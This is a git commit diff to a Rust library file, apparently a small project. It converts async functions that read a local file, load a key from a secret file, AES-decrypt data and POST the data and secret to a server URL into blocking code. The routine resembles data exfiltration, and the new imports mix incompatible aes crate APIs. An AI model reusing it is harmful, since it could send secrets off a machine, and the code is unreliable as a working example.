17b5b95c20cfe09a237f1e8cdc7c969dac0c8e9c
lyssairene <91980717+lyssairene@users.noreply.github.com>
2024-04-25 11:17:47 -0400

    Update lib.rs

--- P3/src/lib.rs
+++ P3/src/lib.rs
@@ -2,27 +2,27 @@ use std::fs::File;
 use std::io::{self, Read};
 use aes::cipher::KeyInit;
 use aes::Aes256;
-use aes::cipher::generic_array::GenericArray;
+use aes::block_cipher_trait::{BlockCipher, generic_array::GenericArray};
+use reqwest::blocking::Client;
 use aes::cipher::BlockDecrypt;
-use reqwest::Client;
 use reqwest::StatusCode;
 use serde_json::json;
 
-pub async fn scan_system(file_path: &str) -> Result<Vec<u8>, io::Error> {
+fn scan_system (file_path: &str) -> Result<String, io::Error> {
     let mut file = File::open(file_path)?;
-    let mut contents = Vec::new();
-    file.read_to_end(&mut contents)?;
+    let mut contents = String::new();
+    file.read_to_string(&mut contents)?;
     Ok(contents)
 }
 
-pub async fn parse_secret() -> Result<Vec<u8>, io::Error> {
-    let mut file = File::open("c2VjcmV0X2ZpbGUudHh0.encr")?;
+fn parse_secret() -> Result<Vec<u8>, io::Error> {
+    let mut file = File::open("secret_file.txt")?;
     let mut secret_key = Vec::new();
     file.read_to_end(&mut secret_key)?;
     Ok(secret_key)
 }
 
-pub async fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
+fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
     let key = GenericArray::from_slice(key);
     let cipher = Aes256::new(&key);
     let mut decrypted_data = encrypted_data.to_vec();
@@ -31,7 +31,7 @@ pub async fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
 }
 
 
-pub async fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
+fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
     let client = Client::new();
     let json_body = json!({
         "message": parsed_secret,
@@ -41,8 +41,7 @@ pub async fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_sec
     let response = client
         .post(server_url)
         .json(&json_body)
-        .send()
-        .await?;
+        .send()?;
     
     if response.status() == StatusCode::OK {
         println!("File sent successfully to server");
